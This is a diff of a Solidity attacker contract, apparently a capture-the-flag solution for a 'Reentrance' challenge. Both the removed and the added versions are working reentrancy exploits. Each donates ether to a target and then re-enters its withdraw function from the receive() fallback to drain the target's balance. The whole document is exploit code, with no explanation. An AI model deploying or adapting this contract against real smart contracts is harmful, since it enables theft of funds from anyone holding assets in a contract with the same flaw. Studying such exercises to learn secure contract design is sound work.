@@ -2,8 +2,8 @@
 
 pragma solidity ^0.8.10;
 
-abstract contract IReentrance {
-    mapping(address => uint256) public balances;
+interface IReentrance {
+    function balanceOf(address _who) external view returns (uint256);
 
     function donate(address _to) external payable virtual;
 
@@ -11,42 +11,39 @@ abstract contract IReentrance {
 }
 
 contract ReentranceHack {
-    IReentrance public challenge;
-    uint256 initialDeposit;
+    address payable _target;
+    IReentrance targetContract;
 
-    constructor(address challengeAddress) {
-        challenge = IReentrance(challengeAddress);
+    event Withdraw();
+    event RemainingBalance(uint256 bal);
+
+    constructor(address target) {
+        _target = payable(target);
+        targetContract = IReentrance(target);
     }
 
-    function attack() external payable {
-        require(msg.value >= 0.1 ether, "send some more ether");
+    function attack() public payable {
+        (bool success, ) = address(targetContract).call{value: msg.value}(
+            abi.encodeWithSelector(
+                targetContract.donate.selector,
+                address(this)
+            )
+        );
+        _withdrawAll(0.1 ether);
+    }
 
-        // first deposit some funds
-        initialDeposit = msg.value;
-        challenge.donate{value: initialDeposit}(address(this));
-
-        // withdraw these funds over and over again because of re-entrancy issue
-        callWithdraw();
+    function _withdrawAll(uint256 amt) internal {
+        targetContract.withdraw(amt);
+        emit Withdraw();
+        emit RemainingBalance(targetContract.balanceOf(address(this)));
     }
 
     receive() external payable {
-        // re-entrance called by challenge
-        callWithdraw();
-    }
-
-    function callWithdraw() private {
-        // this balance correctly updates after withdraw
-        uint256 challengeTotalRemainingBalance = address(challenge).balance;
-        // are there more tokens to empty?
-        bool keepRecursing = challengeTotalRemainingBalance > 0;
-
-        if (keepRecursing) {
-            // can only withdraw at most our initial balance per withdraw call
-            uint256 toWithdraw =
-                initialDeposit < challengeTotalRemainingBalance
-                    ? initialDeposit
-                    : challengeTotalRemainingBalance;
-            challenge.withdraw(toWithdraw);
+        uint256 remaining = targetContract.balanceOf(address(this));
+        if (remaining > 0.1 ether) {
+            _withdrawAll(0.1 ether);
+        } else {
+            _withdrawAll(remaining);
         }
     }
 }
